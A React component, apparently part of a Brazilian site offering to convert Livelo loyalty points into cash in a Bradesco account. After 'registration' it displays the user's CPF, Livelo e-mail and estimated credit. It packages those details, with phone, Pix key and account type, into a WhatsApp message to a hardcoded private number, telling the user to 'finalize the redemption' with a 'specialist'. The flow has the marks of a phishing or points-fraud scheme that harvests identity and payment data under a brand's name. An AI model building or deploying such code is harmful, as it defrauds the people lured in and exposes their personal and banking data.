import React from "react";
import { motion, AnimatePresence } from "motion/react";
import { Check, Phone, X, Copy, CheckSquare, Award } from "lucide-react";
import { Lead } from "../types";

interface SuccessModalProps {
  isOpen: boolean;
  lead: Lead | null;
  onClose: () => void;
}

export default function SuccessModal({ isOpen, lead, onClose }: SuccessModalProps) {
  if (!isOpen || !lead) return null;

  const formattedValue = new Intl.NumberFormat("pt-BR", {
    style: "currency",
    currency: "BRL",
  }).format(lead.estimatedValue);

  // Generate WhatsApp message
  const waNumber = "5573998630223";
  const messageText = `Olá! Fiz o meu cadastro no site de Resgate de Pontos Livelo. Meus dados para simulação são:
- *Nome*: ${lead.name}
- *CPF*: ${lead.cpf}
- *E-mail Livelo*: ${lead.emailLivelo}
- *Pontos*: ${lead.points.toLocaleString("pt-BR")} pts
- *WhatsApp*: ${lead.phone}
${lead.pixKey ? `- *Chave Pix*: ${lead.pixKey}\n` : ""}- *Conta Bradesco*: ${lead.accountType}
- *Valor Estimado*: ${formattedValue}

Quero prosseguir com a simulação de resgate e receber o saldo em minha conta!`;

  const waLink = `https://wa.me/${waNumber}?text=${encodeURIComponent(messageText)}`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(messageText);
    alert("Dados copiados para a área de transferência! Cole na conversa do WhatsApp se preferir.");
  };

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
        
        {/* Modal content Card */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className="relative w-full max-w-lg rounded-2xl border border-slate-100 bg-white p-6 shadow-2xl text-slate-800"
        >
          {/* Close button */}
          <button
            onClick={onClose}
            className="absolute top-4 right-4 rounded-lg p-1.5 text-slate-400 hover:bg-slate-100 hover:text-slate-600 transition-colors"
          >
            <X className="h-5 w-5" />
          </button>

          {/* Icon header */}
          <div className="flex flex-col items-center text-center pb-4">
            <div className="flex h-14 w-14 items-center justify-center rounded-full bg-emerald-100 text-emerald-600 mb-3 animate-pulse">
              <Check className="h-8 w-8" />
            </div>
            <span className="font-mono text-[10px] font-bold uppercase tracking-wider text-emerald-600">
              CADASTRO ENVIADO
            </span>
            <h3 className="font-display text-2xl font-extrabold text-slate-900 mt-1">
              Pronto, {lead.name.split(" ")[0]}!
            </h3>
            <p className="text-sm text-slate-500 mt-1.5">
              Seu cadastro foi salvo com sucesso em nosso sistema de simulação de pontos.
            </p>
          </div>

          {/* Estimate summary card */}
          <div className="rounded-xl bg-slate-50 p-4 border border-slate-100 space-y-2.5 my-4">
            <div className="flex justify-between text-xs text-slate-500 border-b border-slate-200 pb-2">
              <span>Nº Cadastro</span>
              <span className="font-mono font-bold text-slate-700">{lead.id}</span>
            </div>

            <div className="grid grid-cols-2 gap-3 text-sm">
              <div className="flex flex-col">
                <span className="text-[11px] text-slate-400 uppercase font-semibold">Nome</span>
                <span className="font-semibold text-slate-800 truncate">{lead.name}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-[11px] text-slate-400 uppercase font-semibold">CPF</span>
                <span className="font-semibold text-slate-800 font-mono">{lead.cpf}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-[11px] text-slate-400 uppercase font-semibold">E-mail Livelo</span>
                <span className="font-semibold text-slate-800 truncate">{lead.emailLivelo}</span>
              </div>
              <div className="flex flex-col">
                <span className="text-[11px] text-slate-400 uppercase font-semibold">Pontos Simulados</span>
                <span className="font-semibold text-slate-800">{lead.points.toLocaleString("pt-BR")} pts</span>
              </div>
            </div>

            {/* Estimated cash value */}
            <div className="border-t border-slate-200 pt-3 flex items-center justify-between">
              <span className="text-xs font-bold text-slate-600">Estimativa de Crédito:</span>
              <span className="font-display text-lg font-extrabold text-emerald-600">{formattedValue}</span>
            </div>
          </div>

          {/* Action guidance */}
          <div className="space-y-3 pt-2">
            <div className="rounded-lg bg-emerald-50 border border-emerald-100 p-3 flex items-start gap-2.5">
              <Award className="h-5 w-5 text-emerald-600 shrink-0 mt-0.5" />
              <p className="text-xs text-emerald-800 leading-normal font-medium">
                <strong>Atenção:</strong> Para efetivar o resgate e autorizar o depósito do saldo em sua conta Bradesco, clique no botão abaixo para falar com o nosso especialista no WhatsApp.
              </p>
            </div>

            <a
              href={waLink}
              target="_blank"
              rel="noopener noreferrer"
              className="flex w-full items-center justify-center gap-2 rounded-xl bg-emerald-500 py-4 text-center font-display text-base font-bold text-white shadow-lg shadow-emerald-500/20 hover:bg-emerald-600 transition-all active:scale-[0.99]"
            >
              <Phone className="h-5 w-5" />
              Finalizar Resgate no WhatsApp
            </a>

            <button
              onClick={copyToClipboard}
              className="flex w-full items-center justify-center gap-1.5 rounded-xl border border-slate-200 py-2 text-xs font-semibold text-slate-600 hover:bg-slate-50 transition-colors"
            >
              <Copy className="h-3.5 w-3.5" />
              Copiar dados cadastrados
            </button>
          </div>

        </motion.div>

      </div>
    </AnimatePresence>
  );
}
